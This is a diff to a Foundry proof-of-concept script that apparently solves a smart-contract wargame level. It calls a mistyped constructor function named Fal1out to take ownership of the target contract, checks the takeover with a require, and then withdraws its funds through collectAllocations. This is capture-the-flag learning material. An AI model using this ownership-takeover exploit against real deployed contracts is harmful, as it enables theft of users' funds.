@@ -10,9 +10,10 @@ contract POC is Script {
         vm.startBroadcast();
 
         // a typo in the consturctor name would cause the owner to be set to function caller.
-        instance.Fal1out{value: 1 wei}();
+        instance.Fal1out{value: 100 wei}();
 
-        // the owner can withdraw the funds.
+        require(instance.owner() == msg.sender, "owner is not the contract caller");
+        // // the owner can withdraw the funds.
         instance.collectAllocations();
 
         vm.stopBroadcast();
